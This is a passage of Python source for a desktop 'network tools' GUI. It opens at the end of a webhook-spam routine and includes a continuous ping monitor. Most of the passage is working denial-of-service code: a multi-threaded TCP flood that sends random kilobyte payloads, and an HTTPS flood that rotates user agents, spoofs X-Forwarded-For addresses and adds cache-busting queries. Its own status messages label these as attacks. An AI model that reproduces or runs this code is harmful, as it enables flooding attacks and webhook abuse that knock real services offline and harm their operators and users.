                    time.sleep(0.1)  # Rate limiting
                    
                if not self.spam_stop_flag:
                    self.spam_results.insert("end", "-" * 50 + "\n")
                    self.spam_results.insert("end", "🎉 Webhook spam completed!\n")
                else:
                    self.spam_results.insert("end", "⏹ Spam stopped by user\n")
                    
            except Exception as e:
                self.spam_results.insert("end", f"❌ Error: {str(e)}\n")
            finally:
                self.spam_button.configure(state="normal")
                self.stop_spam_button.configure(state="disabled")
                
        threading.Thread(target=spam_thread, daemon=True).start()
        
    def stop_webhook_spam(self):
        self.spam_stop_flag = True
    
    def clear_spam_results(self):
        self.spam_results.delete("0.0", "end")
        
    def start_ping(self):
        target = self.ping_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target IP or domain!")
            return
            
        self.ping_stop_flag = False
        self.ping_button.configure(state="disabled")
        self.stop_ping_button.configure(state="normal")
        
        def ping_thread():
            self.ping_results.delete("0.0", "end")
            self.ping_results.insert("0.0", f"📡 Pinging {target} continuously...\n")
            self.ping_results.insert("end", "-" * 50 + "\n")
            
            # Configure the tags for colored text
            self.ping_results.tag_config("alive", foreground=self.success_color)  # Green for alive
            self.ping_results.tag_config("down", foreground=self.error_color)     # Red for down
            
            while not self.ping_stop_flag:
                try:
                    if platform.system().lower() == "windows":
                        result = subprocess.run(['ping', '-n', '1', target], 
                                              capture_output=True, text=True, timeout=5)
                    else:
                        result = subprocess.run(['ping', '-c', '1', target], 
                                              capture_output=True, text=True, timeout=5)
                    
                    timestamp = time.strftime("%H:%M:%S")
                    
                    if result.returncode == 0:
                        output = result.stdout
                        if "time=" in output:
                            time_part = output.split("time=")[1].split()[0]
                            self.ping_results.insert("end", f"[{timestamp}] Alive - {time_part}\n", ("alive",))
                        else:
                            self.ping_results.insert("end", f"[{timestamp}] Alive - N/A ms\n", ("alive",))
                    else:
                        self.ping_results.insert("end", f"[{timestamp}] Network Down \n", ("down",))
                        
                except Exception as e:
                    timestamp = time.strftime("%H:%M:%S")
                    self.ping_results.insert("end", f"[{timestamp}] Error: {str(e)}\n", ("down",))
                
                self.ping_results.see("end")
                time.sleep(0.5)
                
            self.ping_results.insert("end", "⏹ Ping stopped by user\n")
            self.ping_button.configure(state="normal")
            self.stop_ping_button.configure(state="disabled")
            
        threading.Thread(target=ping_thread, daemon=True).start()
        
    def stop_ping(self):
        self.ping_stop_flag = True
        
    def clear_ping_results(self):
        self.ping_results.delete("0.0", "end")
        
    # TCP Flooding methods
    def start_tcp_flood(self):
        target = self.tcp_target_entry.get().strip()
        port_str = self.tcp_port_entry.get().strip()
        threads_str = self.tcp_threads_entry.get().strip()
        packet_size_str = self.tcp_packet_size_entry.get().strip()
        timeout_str = self.tcp_timeout_entry.get().strip()
        
        if not all([target, port_str, threads_str, packet_size_str, timeout_str]):
            messagebox.showerror("Error", "Please fill in all fields!")
            return
            
        try:
            port = int(port_str)
            threads = int(threads_str)
            packet_size = int(packet_size_str)
            timeout = float(timeout_str)
            
            if port < 1 or port > 65535:
                raise ValueError("Invalid port number")
            if threads < 1:
                raise ValueError("Thread count must be positive")
            if packet_size < 1:
                raise ValueError("Packet size must be positive")
            if timeout <= 0:
                raise ValueError("Timeout must be positive")
                
        except ValueError as e:
            messagebox.showerror("Error", f"Invalid input: {str(e)}")
            return
            
        self.tcp_flood_stop_flag = False
        self.tcp_flood_packets_sent = 0
        self.tcp_flood_bytes_sent = 0
        self.tcp_flood_button.configure(state="disabled")
        self.stop_tcp_flood_button.configure(state="normal")
        self.tcp_flood_results.delete("0.0", "end")
        self.tcp_flood_progress.set(0)
        
        # Convert KB to bytes
        packet_size_bytes = packet_size * 1024
        
        def tcp_flood_thread():
            try:
                target_ip = socket.gethostbyname(target)
                self.tcp_flood_results.insert("0.0", f"🌊 Starting TCP flood attack on {target} ({target_ip}) port {port}\n")
                self.tcp_flood_results.insert("end", f"Using {threads} threads with {packet_size}KB packets\n")
                self.tcp_flood_results.insert("end", "-" * 50 + "\n")
                
                # Configure the tags for colored text
                self.tcp_flood_results.tag_config("success", foreground=self.success_color)
                self.tcp_flood_results.tag_config("error", foreground=self.error_color)
                self.tcp_flood_results.tag_config("info", foreground=self.header_color)
                
                start_time = time.time()
                
                # Pre-generate some random data patterns for efficiency
                data_patterns = []
                for _ in range(10):
                    data_patterns.append(os.urandom(packet_size_bytes))
                
                def flood_worker():
                    local_packets = 0
                    local_bytes = 0
                    
                    while not self.tcp_flood_stop_flag:
                        try:
                            # Create a new socket for each connection
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(timeout)
                            
                            # Try to connect
                            s.connect((target_ip, port))
                            
                            # Send multiple packets in a single connection
                            for _ in range(5):  # Send 5 packets per connection
                                if self.tcp_flood_stop_flag:
                                    break
                                    
                                # Select a random data pattern
                                payload = random.choice(data_patterns)
                                
                                try:
                                    # Send the data
                                    bytes_sent = s.send(payload)
                                    local_packets += 1
                                    local_bytes += bytes_sent
                                    
                                    with threading.Lock():
                                        self.tcp_flood_packets_sent += 1
                                        self.tcp_flood_bytes_sent += bytes_sent
                                except:
                                    # If sending fails, break the loop
                                    break
                            
                            # Close the socket
                            try:
                                s.close()
                            except:
                                pass
                                
                        except Exception:
                            # Connection failed, but we continue flooding
                            pass
                            
                        # Small delay to prevent CPU overload
                        time.sleep(0.001)  # Reduced delay for higher throughput
                    
                    return local_packets, local_bytes
                
                # Start worker threads
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = []
                    for _ in range(threads):
                        if self.tcp_flood_stop_flag:
                            break
                        future = executor.submit(flood_worker)
                        futures.append(future)
                
                    # Monitor and update progress
                    update_interval = 1.0  # Update every second
                    last_update_time = time.time()
                    last_packets = 0
                    last_bytes = 0
                    
                    while not self.tcp_flood_stop_flag and any(not f.done() for f in futures):
                        current_time = time.time()
                        if current_time - last_update_time >= update_interval:
                            elapsed = current_time - start_time
                            packets_per_second = (self.tcp_flood_packets_sent - last_packets) / (current_time - last_update_time)
                            bytes_per_second = (self.tcp_flood_bytes_sent - last_bytes) / (current_time - last_update_time)
                            
                            last_packets = self.tcp_flood_packets_sent
                            last_bytes = self.tcp_flood_bytes_sent
                            last_update_time = current_time
                            
                            # Calculate MB/s
                            mbps = bytes_per_second / (1024 * 1024)
                            
                            # Format total data sent
                            if self.tcp_flood_bytes_sent < 1024 * 1024:
                                total_data = f"{self.tcp_flood_bytes_sent / 1024:.2f} KB"
                            else:
                                total_data = f"{self.tcp_flood_bytes_sent / (1024 * 1024):.2f} MB"
                            
                            status = f"[{time.strftime('%H:%M:%S')}] Sent {self.tcp_flood_packets_sent} packets | {packets_per_second:.2f} packets/sec | {mbps:.2f} MB/s | Total: {total_data}\n"
                            self.tcp_flood_results.insert("end", status, ("info",))
                            self.tcp_flood_results.see("end")
                            
                            # Update progress bar (pulsing effect)
                            progress_value = (self.tcp_flood_progress.get() + 0.1) % 1.0
                            self.tcp_flood_progress.set(progress_value)
                            
                        time.sleep(0.1)
                
                # Final status update
                if not self.tcp_flood_stop_flag:
                    self.tcp_flood_results.insert("end", "-" * 50 + "\n")
                    self.tcp_flood_results.insert("end", "🎉 TCP flood completed!\n")
                else:
                    self.tcp_flood_results.insert("end", "⏹ TCP flood stopped by user\n")
                
                total_time = time.time() - start_time
                
                # Format total data sent
                if self.tcp_flood_bytes_sent < 1024 * 1024:
                    total_data = f"{self.tcp_flood_bytes_sent / 1024:.2f} KB"
                else:
                    total_data = f"{self.tcp_flood_bytes_sent / (1024 * 1024):.2f} MB"
                
                # Calculate average MB/s
                avg_mbps = (self.tcp_flood_bytes_sent / total_time) / (1024 * 1024)
                
                self.tcp_flood_results.insert("end", f"Total packets sent: {self.tcp_flood_packets_sent} in {total_time:.2f} seconds\n")
                self.tcp_flood_results.insert("end", f"Total data sent: {total_data}\n")
                self.tcp_flood_results.insert("end", f"Average rate: {self.tcp_flood_packets_sent/total_time:.2f} packets/sec | {avg_mbps:.2f} MB/s\n")
                
            except Exception as e:
                self.tcp_flood_results.insert("end", f"❌ Error: {str(e)}\n", ("error",))
            finally:
                self.tcp_flood_button.configure(state="normal")
                self.stop_tcp_flood_button.configure(state="disabled")
                self.tcp_flood_progress.set(0)
                
        threading.Thread(target=tcp_flood_thread, daemon=True).start()
        
    def stop_tcp_flood(self):
        self.tcp_flood_stop_flag = True
        
    def clear_tcp_flood_results(self):
        self.tcp_flood_results.delete("0.0", "end")
        
    # HTTPS Flooding methods
    def start_https_flood(self):
        target_url = self.https_target_entry.get().strip()
        threads_str = self.https_threads_entry.get().strip()
        requests_str = self.https_requests_entry.get().strip()
        data_size_str = self.https_data_size_entry.get().strip()
        timeout_str = self.https_timeout_entry.get().strip()
        http_method = self.https_method_var.get()
        
        if not all([target_url, threads_str, requests_str, data_size_str, timeout_str]):
            messagebox.showerror("Error", "Please fill in all fields!")
            return
            
        if not target_url.startswith(("http://", "https://")):
            messagebox.showerror("Error", "URL must start with http:// or https://")
            return
            
        try:
            threads = int(threads_str)
            requests_per_thread = int(requests_str)
            data_size = int(data_size_str)
            timeout = float(timeout_str)
            
            if threads < 1:
                raise ValueError("Thread count must be positive")
            if requests_per_thread < 1:
                raise ValueError("Requests per thread must be positive")
            if data_size < 1:
                raise ValueError("Data size must be positive")
            if timeout <= 0:
                raise ValueError("Timeout must be positive")
                
        except ValueError as e:
            messagebox.showerror("Error", f"Invalid input: {str(e)}")
            return
            
        self.https_flood_stop_flag = False
        self.https_flood_requests_sent = 0
        self.https_flood_bytes_sent = 0
        self.https_flood_button.configure(state="disabled")
        self.stop_https_flood_button.configure(state="normal")
        self.https_flood_results.delete("0.0", "end")
        self.https_flood_progress.set(0)
        
        # Convert KB to bytes
        data_size_bytes = data_size * 1024
        
        def https_flood_thread():
            try:
                self.https_flood_results.insert("0.0", f"🌊 Starting HTTPS flood attack on {target_url}\n")
                self.https_flood_results.insert("end", f"Using {threads} threads with {http_method} method and {data_size}KB data\n")
                self.https_flood_results.insert("end", "-" * 50 + "\n")
                
                # Configure the tags for colored text
                self.https_flood_results.tag_config("success", foreground=self.success_color)
                self.https_flood_results.tag_config("error", foreground=self.error_color)
                self.https_flood_results.tag_config("info", foreground=self.header_color)
                
                start_time = time.time()
                total_requests = threads * requests_per_thread
                
                # User agents for randomization
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
                ]
                
                # Pre-generate some random data patterns for efficiency
                data_patterns = []
                for _ in range(5):
                    data_patterns.append(os.urandom(data_size_bytes))
                
                def flood_worker(thread_id):
                    local_requests = 0
                    local_bytes = 0
                    session = requests.Session()
                    
                    # Configure session for maximum efficiency
                    adapter = requests.adapters.HTTPAdapter(
                        pool_connections=50,
                        pool_maxsize=50,
                        max_retries=0
                    )
                    session.mount('http://', adapter)
                    session.mount('https://', adapter)
                    
                    for i in range(requests_per_thread):
                        if self.https_flood_stop_flag:
                            break
                            
                        try:
                            # Randomize headers
                            headers = {
                                "User-Agent": random.choice(user_agents),
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                "Accept-Language": "en-US,en;q=0.5",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Connection": "keep-alive",
                                "Cache-Control": "no-cache, no-store, must-revalidate",
                                "Pragma": "no-cache",
                                "X-Requested-With": "XMLHttpRequest",
                                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                            }
                            
                            # Add random query parameter to bypass cache
                            url = f"{target_url}?{random.randint(1, 1000000)}&t={time.time()}"
                            
                            # Select random data
                            data = random.choice(data_patterns)
                            
                            # Send the request based on method
                            if http_method == "GET":
                                response = session.get(url, headers=headers, timeout=timeout, allow_redirects=False)
                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
                            elif http_method == "POST":
                                response = session.post(url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items()) + len(data)
                            elif http_method == "PUT":
                                response = session.put(url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items()) + len(data)
                            elif http_method == "DELETE":
                                response = session.delete(url, headers=headers, timeout=timeout, allow_redirects=False)
                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
                            else:  # HEAD
                                response = session.head(url, headers=headers, timeout=timeout, allow_redirects=False)
                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
                            
                            local_requests += 1
                            local_bytes += bytes_sent
                            
                            with threading.Lock():
                                self.https_flood_requests_sent += 1
                                self.https_flood_bytes_sent += bytes_sent
                                
                        except Exception:
                            # Request failed, but we continue flooding
                            pass
                            
                        # Small delay to prevent CPU overload
                        time.sleep(0.001)  # Reduced delay for higher throughput
                    
                    return local_requests, local_bytes
                
                # Start worker threads
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = []
                    for i in range(threads):
                        if self.https_flood_stop_flag:
                            break
                        future = executor.submit(flood_worker, i)
                        futures.append(future)
                
                    # Monitor and update progress
                    update_interval = 1.0  # Update every second
                    last_update_time = time.time()
                    last_requests = 0
                    last_bytes = 0
                    
                    while not self.https_flood_stop_flag and any(not f.done() for f in futures):
                        current_time = time.time()
                        if current_time - last_update_time >= update_interval:
                            elapsed = current_time - start_time
                            requests_per_second = (self.https_flood_requests_sent - last_requests) / (current_time - last_update_time)
                            bytes_per_second = (self.https_flood_bytes_sent - last_bytes) / (current_time - last_update_time)
                            
                            last_requests = self.https_flood_requests_sent
                            last_bytes = self.https_flood_bytes_sent
                            last_update_time = current_time
                            
                            # Calculate MB/s
                            mbps = bytes_per_second / (1024 * 1024)
                            
                            # Format total data sent
                            if self.https_flood_bytes_sent < 1024 * 1024:
                                total_data = f"{self.https_flood_bytes_sent / 1024:.2f} KB"
                            else:
                                total_data = f"{self.https_flood_bytes_sent / (1024 * 1024):.2f} MB"
                            
                            progress = min(self.https_flood_requests_sent / total_requests, 1.0)
                            self.https_flood_progress.set(progress)
                            
                            status = f"[{time.strftime('%H:%M:%S')}] Sent {self.https_flood_requests_sent}/{total_requests} requests | {requests_per_second:.2f} req/sec | {mbps:.2f} MB/s | Total: {total_data}\n"
                            self.https_flood_results.insert("end", status, ("info",))
                            self.https_flood_results.see("end")
                            
                        time.sleep(0.1)
                
                # Final status update
                if not self.https_flood_stop_flag:
                    self.https_flood_results.insert("end", "-" * 50 + "\n")
                    self.https_flood_results.insert("end", "🎉 HTTPS flood completed!\n")
                else:
                    self.https_flood_results.insert("end", "⏹ HTTPS flood stopped by user\n")
                
                total_time = time.time() - start_time
                
                # Format total data sent
                if self.https_flood_bytes_sent < 1024 * 1024:
                    total_data = f"{self.https_flood_bytes_sent / 1024:.2f} KB"
                else:
                    total_data = f"{self.https_flood_bytes_sent / (1024 * 1024):.2f} MB"
                
                # Calculate average MB/s
                avg_mbps = (self.https_flood_bytes_sent / total_time) / (1024 * 1024)
                
                self.https_flood_results.insert("end", f"Total requests sent: {self.https_flood_requests_sent} in {total_time:.2f} seconds\n")
                self.https_flood_results.insert("end", f"Total data sent: {total_data}\n")
                self.https_flood_results.insert("end", f"Average rate: {self.https_flood_requests_sent/total_time:.2f} req/sec | {avg_mbps:.2f} MB/s\n")
                
            except Exception as e:
                self.https_flood_results.insert("end", f"❌ Error: {str(e)}\n", ("error",))
            finally:
                self.https_flood_button.configure(state="normal")
                self.stop_https_flood_button.configure(state="disabled")
                
        threading.Thread(target=https_flood_thread, daemon=True).start()
        
    def stop_https_flood(self):
        self.https_flood_stop_flag = True
        
    def clear_https_flood_results(self):
        self.https_flood_results.delete("0.0", "end")

def main():
    root = ctk.CTk()
    app = NetworkToolsGUI(root)
    
    # Center window on screen
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
    y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
    root.geometry(f"+{x}+{y}")
    
    root.mainloop()

if __name__ == "__main__":
    main()